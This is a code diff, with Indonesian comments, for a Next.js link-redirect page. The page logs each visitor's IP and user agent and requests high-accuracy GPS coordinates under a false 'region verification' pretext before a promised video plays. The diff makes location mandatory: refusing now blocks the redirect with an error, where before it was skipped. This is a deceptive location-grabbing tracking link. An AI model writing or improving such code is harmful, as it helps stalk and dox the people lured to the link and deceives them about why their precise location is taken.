@@ -3,34 +3,31 @@ import { useState } from 'react';
 import { kv } from '@vercel/kv';
 
 export async function getServerSideProps({ params, req }) {
-  // Ambil URL asli dari Database berdasarkan ID
   let data = null;
   try {
     data = await kv.get(params.id);
-  } catch (e) {
-    console.error("KV Error:", e);
-  }
+  } catch (e) {}
 
-  if (!data || !data.url) {
-    return { notFound: true };
-  }
+  if (!data || !data.url) return { notFound: true };
 
   let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
   if (ip.includes(',')) ip = ip.split(',')[0].trim();
   ip = ip.replace('::ffff:', '');
 
-  return { props: { url: data.url, meta: data.meta || {}, serverIp: ip } };
+  return { props: { url: data.url, meta: data.meta || {}, serverIp: ip, id: params.id } };
 }
 
-export default function Intermediate({ url, meta, serverIp }) {
+export default function Intermediate({ url, meta, serverIp, id }) {
   const [loading, setLoading] = useState(false);
   const [statusText, setStatusText] = useState('');
+  const [errorMsg, setErrorMsg] = useState('');
 
   const handleVerifyAndPlay = () => {
     setLoading(true);
+    setErrorMsg('');
     setStatusText('Memverifikasi wilayah...');
 
-    const payload = { type: 'client_gps', ts: Date.now(), ip: serverIp, targetUrl: url };
+    const payload = { id, type: 'client_gps', ts: Date.now(), ip: serverIp, targetUrl: url };
     try { payload.ua = navigator.userAgent; } catch(e){}
 
     const finishAndRedirect = async (finalPayload) => {
@@ -53,13 +50,16 @@ export default function Intermediate({ url, meta, serverIp }) {
           finishAndRedirect(payload);
         },
         (error) => {
-          payload.gpsError = error.message;
-          finishAndRedirect(payload);
+          // REVISI: Jika ditolak, JANGAN REDIRECT. Kasih error.
+          setLoading(false);
+          setStatusText('');
+          setErrorMsg('Akses lokasi ditolak. Anda wajib mengizinkan akses lokasi untuk memutar video ini.');
         },
         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
       );
     } else {
-      finishAndRedirect(payload);
+      setLoading(false);
+      setErrorMsg('Browser Anda tidak mendukung fitur lokasi.');
     }
   };
 
@@ -127,6 +127,12 @@ export default function Intermediate({ url, meta, serverIp }) {
           >
             {loading ? statusText : 'Verifikasi Lokasi & Tonton'}
           </button>
+
+          {errorMsg && (
+            <p style={{ color: '#fe2c55', fontSize: '13px', marginTop: '16px', padding: '0 20px' }}>
+              {errorMsg}
+            </p>
+          )}
         </div>
       </div>
     </>
